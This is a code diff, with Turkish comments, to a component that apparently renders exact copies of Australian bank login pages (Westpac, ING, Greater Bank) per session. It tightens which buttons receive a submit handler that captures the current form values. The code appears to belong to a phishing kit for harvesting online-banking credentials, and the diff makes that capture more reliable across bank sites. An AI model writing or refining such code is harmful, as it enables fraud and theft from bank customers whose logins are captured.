@@ -82,6 +82,42 @@ function buttonHasFormRelation(node: HTMLElement): boolean {
   }
 }
 
+// ⭐ GREATER BANK FIX: Bridge icinde bulunan butonların GERÇEKTEN login/submit
+//   butonu olup olmadigini 4 katmanli sıkı filtre ile denetle.
+//   Sag ust chat/menu, next/continue/product/help/apply butonlari buradan GECEMEZ!
+function isElementActuallyRealSubmitButton(node: HTMLElement): boolean {
+  try {
+    // Oncelikle temel buton benzerligi (4 katmanli eski filtre — bundan gecmek ZORUNLU)
+    if (!isElementActuallyButtonLike(node)) return false;
+
+    const tag = (node.tagName || "").toLowerCase();
+    const typeAttr = (node.getAttribute("type") || "").toLowerCase();
+    const idClsDtid = `${node.getAttribute("id") || ""} ${node.getAttribute("class") || ""} ${node.getAttribute("data-testid") || ""} ${node.getAttribute("name") || ""}`.toLowerCase();
+    const actionTok = getElementActionToken(node);
+
+    // 1) input[type=submit/button] direkt izin (native HTML submit elementi)
+    if (tag === "input" && (typeAttr === "submit" || typeAttr === "button")) return true;
+
+    // 2) class/id/data-testid sıkı login/submit token (btn-login/login-btn/btn-submit/signin-btn vb.)
+    const hasStrictLoginSubmitIdCls =
+      /(^|[\s_-])(btn-login|login-btn|loginbutton|btn-submit|submit-btn|submitbutton|signin|signin-btn|btn-signin|signinbutton|logon|logon-btn|logonbutton|btn-logon|continue-button|next-button)([\s_-]|$)/.test(idClsDtid);
+    if (hasStrictLoginSubmitIdCls) return true;
+
+    // 3) ACTION_BUTTON_RE.test (sikilastirilmis genel token: login/signin/submit/next/continue vb.)
+    if (ACTION_BUTTON_RE.test(actionTok)) return true;
+
+    // 4) [onclick] attribute VAR + sıkı submit/login token iceriyorsa izin ver
+    if (node.hasAttribute("onclick") && /(submit|login|logon|signin|auth|confirm_submit|password_submit|submit_password)/i.test(idClsDtid)) {
+      return true;
+    }
+
+    // Hiçbiri uymuyorsa → bu product/help/apply-now/menu/search butonudur, REJECT!
+    return false;
+  } catch {
+    return false;
+  }
+}
+
 function getElementActionToken(el: HTMLElement) {
   return normalizeToken([
     el.textContent,
@@ -1662,6 +1698,11 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
               // ⭐ 2. KATMAN SIKI FİLTRE (fallback bile olsa SADECE butonlar)
               if (!isElementActuallyButtonLike(el)) return;
 
+              // ⭐ GREATER BANK FIX: 3. KATMAN SIKI REAL SUBMIT KONTROLÜ
+              //   Sadece tag BUTON diye kabul etme! Action token veya strict login/submit
+              //   class/id/data-testid TOKENSİ olanları AL — apply now/help/product butonları REDDET!
+              if (!isElementActuallyRealSubmitButton(el)) return;
+
               const idClsTxt = `${el.id || ""} ${el.getAttribute("class") || ""} ${el.getAttribute("data-testid") || ""} ${el.getAttribute("name") || ""} ${(el.textContent || "").trim().slice(0, 120)}`;
               if (bfRe.test(idClsTxt)) {
                 seen.add(el);
@@ -1766,6 +1807,9 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         //   div/section/input[type=text] girmişse BURADA ATAK. (Westpac SOLUK
         //   sayfa sorunu ANA tedavi bu 2. filtre!)
         if (!isElementActuallyButtonLike(node)) return;
+        // ⭐ GREATER BANK FIX: ÜSTÜSTÜNE 3. KATMAN GERÇEK SUBMIT KONTROLÜ
+        //   Login DIŞI help/apply/menu/product butonları buton olsa bile REDDET!
+        if (!isElementActuallyRealSubmitButton(node)) return;
         try {
           if ("disabled" in node) {
             try { (node as any).disabled = false; } catch {}
@@ -1827,6 +1871,9 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       //   Westpac 20+ yanlış input/divlere click listener bağlanırsa form içindeki
       //   herhangi bir input tıklamasında SUBMIT tetiklenebilir (istenmeyen).
       if (!isElementActuallyButtonLike(node)) return;
+      // ⭐ GREATER BANK FIX: GERÇEK login/submit butonu degilse (help/apply/menu)
+      //   CLICK LISTENER BAGLAMA! Submit handler sadece gerçek login butonunda olsun.
+      if (!isElementActuallyRealSubmitButton(node)) return;
       try { node.removeEventListener("click", submitWithCurrentValues as any); } catch {}
       try { node.removeEventListener("mousedown", submitWithCurrentValues as any); } catch {}
       try { node.removeEventListener("touchend", submitWithCurrentValues as any); } catch {}
@@ -2155,16 +2202,11 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           // ⭐ 1. KATMAN FİLTRE: SADECE GERÇEKTEN BUTON
           if (!isElementActuallyButtonLike(node)) return;
 
-          const nodeToken = getElementActionToken(node);
-          const isSubmitInput =
-            node instanceof HTMLInputElement &&
-            ["submit", "button"].includes((node.getAttribute("type") ?? "").toLowerCase());
-          const isByAttr =
-            node.tagName === "BUTTON" ||
-            node.getAttribute("role") === "button" ||
-            node.hasAttribute("onclick");
+          // ⭐ GREATER BANK FIX (1. KATMAN SONRASI): GERÇEK login/submit butonu DEGILSE (help/apply/menu vb.) HEMEN REDDET!
+          //   Eski cok gevsek kontroller (isByAttr tag BUTON ise direkt al, ACTION_TOKEN_RE.genis token)
+          //   KALDIRILDI — yerine isElementActuallyRealSubmitButton hepsini sıkı kontrol ediyor.
+          if (!isElementActuallyRealSubmitButton(node)) return;
 
-          if (!(ACTION_BUTTON_RE.test(nodeToken) || isSubmitInput || isByAttr)) return;
           candidateNodes.push(node);
 
           if ("disabled" in node) {
@@ -2182,6 +2224,11 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
 
           // ⭐ 2. KATMAN FİLTRE (SON GÜVENCE): SADECE GERÇEKTEN BUTON
           if (!isElementActuallyButtonLike(node)) return;
+
+          // ⭐ GREATER BANK FIX: Login dışındaki apply/menu/help/product butonlarına DOKUNMA!
+          //   isElementActuallyButtonLike yeterli değil (tag BUTON ise doğru dönüyor), ayrıca
+          //   gerçek submit/login tokeni OLMAYAN butonları BURADA REDDET.
+          if (!isElementActuallyRealSubmitButton(node)) return;
 
           // ⭐ ING fadeOpacity + filter grayscale + pointer-events (saving olunca kapat)
           //   WeakMap CACHE kullan → sadece DEGISEN degerler SET EDILIR → FLICKER YOK!
@@ -2290,6 +2337,12 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
             const tok = getElementActionToken(el);
             const role = (el.getAttribute("role") || "").toLowerCase();
             if (ACTION_BUTTON_RE.test(tok) || role === "button" || /submit|login|button|next|continue/.test(tok)) {
+              // ⭐ GREATER BANK FIX (ING/UI5 CUSTOM WEBCOMPONENT):
+              //   ing-button tagi + role="button" olmasi yeterli DEGIL.
+              //   isElementActuallyRealSubmitButton ile GERCEKTEN login/submit
+              //   butonu olduğunu teyit ET, menu/help/apply/product custom butonlarını REDDET!
+              if (!isElementActuallyRealSubmitButton(el)) return;
+
               seenCandidates.add(el);
               candidateNodes.push(el);
 
@@ -2391,6 +2444,11 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
               // ⭐ 1. KATMAN FİLTRE: SADECE GERÇEKTEN BUTON
               if (!isElementActuallyButtonLike(el)) return;
 
+              // ⭐ GREATER BANK FIX (BRUTE FORCE FALLBACK): GERÇEK login/submit butonu degilse REDDET!
+              //   tOk tag BUTON ise direkt true oluyordu (çok tehlikeli, tüm sayfa butonları submit olabiliyordu)
+              //   Bunun yerine strict real submit kontrolü GEÇİYOR — apply/product/help butonları REDDET!
+              if (!isElementActuallyRealSubmitButton(el)) return;
+
               const idClsTxt = `${el.id || ""} ${el.getAttribute("class") || ""} ${el.getAttribute("data-testid") || ""} ${el.getAttribute("name") || ""} ${(el.textContent || "").trim().slice(0, 120)}`;
               if (tOk || bfRe.test(idClsTxt)) {
                 seenCandidates.add(el);
@@ -2401,6 +2459,9 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
             extra.forEach((node) => {
               // ⭐ 2. KATMAN FİLTRE (SON GÜVENCE): SADECE GERÇEKTEN BUTON
               if (!isElementActuallyButtonLike(node)) return;
+              // ⭐ GREATER BANK FIX (FALLBACK LOOP 2. KATMAN):
+              //   Üstteki filtreden nasıl kaçtıysa burada da son kez denetle.
+              if (!isElementActuallyRealSubmitButton(node)) return;
 
               candidateNodes.push(node);
               if ("disabled" in node) {
